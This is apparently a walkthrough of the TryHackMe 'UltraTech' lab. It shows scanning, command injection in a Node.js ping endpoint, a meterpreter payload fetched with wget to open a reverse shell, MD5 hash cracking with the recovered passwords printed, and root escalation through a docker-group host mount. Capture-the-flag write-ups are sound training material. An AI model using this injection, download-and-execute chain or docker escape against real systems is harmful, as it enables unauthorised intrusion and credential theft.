| Category          | Details                                            |
|-------------------|----------------------------------------------------|
| 📝 **Name**       | [UltraTech](https://tryhackme.com/room/ultratech1) |  
| 🏷 **Type**       | THM Challenge                                      |
| 🖥 **OS**         | Linux                                              |
| 🎯 **Difficulty** | Medium                                             |
| 📁 **Tags**       | Node.js, Command injection, docker group           |

## Task 2: It's enumeration time!

### Which software is using the port 8081?

#### Scan target with `nmap`
```
┌──(magicrc㉿perun)-[~/attack/THM UltraTech]
└─$ nmap -sS -sC -sV -p- $TARGET
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-21 12:51 CET
Nmap scan report for 10.80.142.173
Host is up (0.053s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.5
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 da:c7:33:62:80:ed:1f:c1:8a:a2:54:08:e2:c1:9e:25 (RSA)
|   256 b7:aa:3a:26:17:1c:7d:c0:89:23:74:04:04:02:ec:67 (ECDSA)
|_  256 6d:9f:30:7d:b5:b6:17:88:03:51:60:7e:43:e7:b1:45 (ED25519)
8081/tcp  open  http    Node.js Express framework
|_http-cors: HEAD GET POST PUT DELETE PATCH
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
31331/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 90.10 seconds
```
We can see that `Node.js` is running at `8081`

### Which other non-standard port is used?
`nmap` scan shows `Apache/2.4.41` is running at `31331`

### Which software using this port?
We already know that this is `Apache`

### Which GNU/Linux distribution seems to be used?
We can see in `nmap` output it's `Ubuntu`

### The software using the port 8081 is a REST api, how many of its routes are used by the web application?

#### Enumerate web application
```
┌──(magicrc㉿perun)-[~/attack/THM UltraTech]
└─$ feroxbuster --url http://$TARGET:31331/ -w /usr/share/wordlists/dirb/big.txt 
<SNIP>
200      GET        1l      396w     8929c http://10.80.142.173:31331/images/undraw_responsive.svg
200      GET       65l      229w     2534c http://10.80.142.173:31331/what.html
200      GET      139l      531w     6092c http://10.80.142.173:31331/index.html
200      GET        1l      178w    19165c http://10.80.142.173:31331/js/app.min.js
200      GET      139l      531w     6092c http://10.80.142.173:31331/
200      GET       37l       86w      883c http://10.80.142.173:31331/js/api.js
200      GET     1463l     4649w    44494c http://10.80.142.173:31331/js/app.js
200      GET     1393l     3543w    30017c http://10.80.142.173:31331/css/style.css
301      GET        9l       28w      321c http://10.80.142.173:31331/css => http://10.80.142.173:31331/css/
200      GET        7l       25w    32412c http://10.80.142.173:31331/favicon.ico
301      GET        9l       28w      324c http://10.80.142.173:31331/images => http://10.80.142.173:31331/images/
301      GET        9l       28w      328c http://10.80.142.173:31331/javascript => http://10.80.142.173:31331/javascript/
301      GET        9l       28w      320c http://10.80.142.173:31331/js => http://10.80.142.173:31331/js/
301      GET        9l       28w      334c http://10.80.142.173:31331/javascript/async => http://10.80.142.173:31331/javascript/async/
200      GET        5l        6w       53c http://10.80.142.173:31331/robots.txt
200      GET     1058l     3007w    32659c http://10.80.142.173:31331/javascript/async/async
301      GET        9l       28w      335c http://10.80.142.173:31331/javascript/jquery => http://10.80.142.173:31331/javascript/jquery/
200      GET    10363l    41520w   271756c http://10.80.142.173:31331/javascript/jquery/jquery
<SNIP>
```

#### Analyze content of `api.js`
```
┌──(magicrc㉿perun)-[~/attack/THM UltraTech]
└─$ curl -s http://$TARGET:31331/js/api.js | cat -n
     1  (function() {
     2      console.warn('Debugging ::');
     3
     4      function getAPIURL() {
     5          return `${window.location.hostname}:8081`
     6      }
     7      
     8      function checkAPIStatus() {
     9          const req = new XMLHttpRequest();
    10          try {
    11              const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
    12              req.open('GET', url, true);
    13              req.onload = function (e) {
    14                  if (req.readyState === 4) {
    15                      if (req.status === 200) {
    16                          console.log('The api seems to be running')
    17                      } else {
    18                          console.error(req.statusText);
    19                      }
    20                  }
    21              };
    22              req.onerror = function (e) {
    23                  console.error(xhr.statusText);
    24              };
    25              req.send(null);
    26          }
    27          catch (e) {
    28              console.error(e)
    29              console.log('API Error');
    30          }
    31      }
    32      checkAPIStatus()
    33      const interval = setInterval(checkAPIStatus, 10000);
    34      const form = document.querySelector('form')
    35      form.action = `http://${getAPIURL()}/auth`;
    36      
    37  })();
```
We can see 2 HTTP endpoints, `/ping` (in line 11) and `/auth` (in line 35).

## Task 3: Let the fun begin

### There is a database lying around, what is its filename?

#### Discover that `/ping` REST endpoint prints direct output `ping` command
```
┌──(magicrc㉿perun)-[~/attack/THM UltraTech]
└─$ curl "http://$TARGET:8081/ping?ip=$TARGET" 
PING 10.80.142.173 (10.80.142.173) 56(84) bytes of data.
64 bytes from 10.80.142.173: icmp_seq=1 ttl=64 time=0.052 ms

--- 10.80.142.173 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.052/0.052/0.052/0.000 ms
```
Such output would suggest that Node.js application is executing system command, which could be prone to command injection vulnerability.

#### Confirm command injection vulnerability using backticks
```
┌──(magicrc㉿perun)-[~/attack/THM UltraTech]
└─$ CMD=$(echo -n "\`id\`" | jq -sRr @uri) 
curl "http://$TARGET:8081/ping?ip=$CMD"
ping: groups=1002(www): Name or service not known
```

#### Prepare command injection exploit
```
┌──(magicrc㉿perun)-[~/attack/THM UltraTech]
└─$ { cat <<'EOF'> cmd.sh
CMD=$(echo -n "\`$1\`" | jq -sRr @uri)
curl "http://$TARGET:8081/ping?ip=$CMD"
EOF
} && chmod +x cmd.sh
```

#### Start Metasploit and listen for reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/THM UltraTech]
└─$ msfconsole -q -x "use exploit/multi/handler; set LHOST tun0; set LPORT 4444; set payload linux/x64/meterpreter/reverse_tcp; run" 
[*] Using configured payload generic/shell_reverse_tcp
LHOST => tun0
LPORT => 4444
payload => linux/x64/meterpreter/reverse_tcp
[*] Started reverse TCP handler on 192.168.132.170:4444
```

#### Generate and host `linux/x64/meterpreter/reverse_tcp` reverse shell
```
┌──(magicrc㉿perun)-[~/attack/THM UltraTech]
└─$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=4444 -f elf -o shell && python3 -m http.server 80
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes
Saved as: shell
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

#### Spawn reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/THM UltraTech]
└─$ ./cmd.sh 'wget -P /tmp 192.168.132.170/shell' && \
./cmd.sh 'chmod +x /tmp/shell' && \
./cmd.sh '/tmp/shell'
--2025-12-22 08:55:46--  http://192.168.132.170/shell
Connecting to 192.168.132.170:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 250 [application/octet-stream]
Saving to: ‘/tmp/shell’

     0K                                                       100%  432K=0.001s

2025-12-22 08:55:46 (432 KB/s) - ‘/tmp/shell’ saved [250/250]

ping: usage error: Destination address required
ping: usage error: Destination address required
```

#### Confirm foothold gained
```
[*] Sending stage (3090404 bytes) to 10.80.142.173
[*] Meterpreter session 1 opened (192.168.132.170:4444 -> 10.80.142.173:38062) at 2025-12-22 09:55:50 +0100

meterpreter > getuid
Server username: www
```

#### Look for database file in current directory (`/home/www/api`)
```
meterpreter > ls -la
Listing: /home/www/api
======================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100644/rw-r--r--  1750   fil   2019-03-22 19:07:09 +0100  index.js
040775/rwxrwxr-x  4096   dir   2025-10-26 10:42:01 +0100  node_modules
100644/rw-r--r--  45458  fil   2025-10-26 10:42:01 +0100  package-lock.json
100644/rw-r--r--  370    fil   2019-03-22 19:07:09 +0100  package.json
100750/rwxr-x---  124    fil   2025-10-26 10:46:32 +0100  start.sh
100644/rw-r--r--  8192   fil   2019-03-22 19:07:09 +0100  utech.db.sqlite
```
We can see `utech.db.sqlite` sitting next to `index.js`.

### What is the first user's password hash?

#### Download `utech.db.sqlite`
```
meterpreter > download utech.db.sqlite
[*] Downloading: utech.db.sqlite -> /home/magicrc/attack/THM UltraTech/utech.db.sqlite
[*] Downloaded 8.00 KiB of 8.00 KiB (100.0%): utech.db.sqlite -> /home/magicrc/attack/THM UltraTech/utech.db.sqlite
[*] Completed  : utech.db.sqlite -> /home/magicrc/attack/THM UltraTech/utech.db.sqlite
```

#### Access `utech.db.sqlite` database
```
┌──(magicrc㉿perun)-[~/attack/THM UltraTech]
└─$ sqlite3 utech.db.sqlite
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
users
sqlite> SELECT * FROM USERS;
admin|0d0ea5111e3c1def594c1684e3b9be84|0
r00t|f357a0c52799563c7c7b76c1e7543a32|0
```
Actually hash for 2nd (`root`) user seems to be correct an answer.

### What is the password associated with this hash?

#### Discover MD5 is being used to hash passwords
```
meterpreter > cat index.js 
<SNIP>
app.get('/auth', (req, res) => {
    const login = req.query.login;
    const password = req.query.password;
    if (!login || !password) {
        res.send('You must specify a login and a password')
    } else {
        for (let user of users) {
            if (user.login === login && user.password === md5(password)) {
                res.send(loggedView)
                return
            } 
        }
        res.send('Invalid credentials')
    }
})
<SNIP>
```

#### Extract hashes and use `hashcat` to crack them
```
┌──(magicrc㉿perun)-[~/attack/THM UltraTech]
└─$ sqlite3 utech.db.sqlite "SELECT login, password FROM users" | sed 's/|/:/g' > utech.hash && \
hashcat -m 0 utech.hash /usr/share/wordlists/rockyou.txt --username --quiet && \
hashcat -m 0 utech.hash --username --show 2> /dev/null | awk -F: '{print $1 ":" $3}'
admin:mrsheafy
r00t:n100906
```

## Task 4: The root of all evil

### What are the first 9 characters of the root user's private SSH key?

#### Reuse credentials for user `r00t` to access target over SSH
```
┌──(magicrc㉿perun)-[~/attack/THM UltraTech]
└─$ ssh r00t@$TARGET
<SNIP>>
r00t@10.80.142.173's password: 
r00t@ip-10-80-142-173:~$ id
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
```
We can see that `r00t` is member of `docker` group which is effectively equivalent to `root`.

#### List docker images
```
r00t@ip-10-81-136-89:~$ docker images
REPOSITORY   TAG       IMAGE ID       CREATED       SIZE
bash         latest    495d6437fc1e   6 years ago   15.8MB
```

#### Use docker image with host filesystem mounted
```
r00t@ip-10-81-136-89:~$ docker run -it --rm -v /:/mnt bash chroot /mnt /bin/sh
#
```

#### Get 9 first characters of `root` user private key
```
# sed -n '2p' /root/.ssh/id_rsa | cut -c1-9
MIIEogIBA
```
